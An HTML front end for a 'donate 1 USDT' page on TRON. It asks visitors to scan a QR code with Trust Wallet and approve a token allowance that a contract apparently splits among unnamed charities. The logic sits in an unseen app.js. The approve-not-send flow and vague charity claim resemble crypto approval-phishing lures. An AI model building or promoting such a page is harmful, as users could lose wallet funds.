<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Donation - Scan & Approve</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            min-height: 100vh;
        }
        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .pulse-glow {
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 10px rgba(34, 197, 94, 0.3); }
            to { box-shadow: 0 0 25px rgba(34, 197, 94, 0.6); }
        }
    </style>
</head>
<body class="flex items-center justify-center p-4">
    <div class="w-full max-w-sm">
        <!-- Header -->
        <div class="text-center mb-6">
            <h1 class="text-3xl font-bold text-white mb-2">🤝 Donate 1 USDT</h1>
            <p class="text-gray-400 text-sm">Scan → Approve → Auto-split to 10 charities</p>
        </div>

        <!-- QR Card -->
        <div class="glass rounded-2xl p-6 shadow-2xl text-center">
            <!-- QR Code -->
            <p class="text-gray-300 mb-4 text-sm">Scan with Trust Wallet to approve 1 USDT</p>
            <div id="qrcode" class="flex justify-center mb-4 bg-white rounded-xl p-4 mx-auto w-fit pulse-glow"></div>

            <!-- How it works -->
            <div class="mt-6 text-left space-y-3">
                <div class="flex items-start gap-3">
                    <div class="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span class="text-blue-400 text-xs font-bold">1</span>
                    </div>
                    <p class="text-gray-400 text-sm">Scan QR with Trust Wallet</p>
                </div>
                <div class="flex items-start gap-3">
                    <div class="w-6 h-6 rounded-full bg-yellow-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span class="text-yellow-400 text-xs font-bold">2</span>
                    </div>
                    <p class="text-gray-400 text-sm">Confirm the 1 USDT approval in your wallet</p>
                </div>
                <div class="flex items-start gap-3">
                    <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span class="text-green-400 text-xs font-bold">3</span>
                    </div>
                    <p class="text-gray-400 text-sm">Done! Contract auto-splits to charities</p>
                </div>
            </div>

            <!-- Mobile button -->
            <div class="mt-6 pt-4 border-t border-gray-700">
                <p class="text-xs text-gray-500 mb-2">On mobile?</p>
                <a id="mobile-link" href="#" class="inline-block px-5 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm font-medium transition">
                    Open in Trust Wallet
                </a>
            </div>
        </div>

        <!-- Footer -->
        <div class="mt-4 text-center">
            <p class="text-xs text-gray-600">Powered by TRON • USDT TRC20</p>
        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
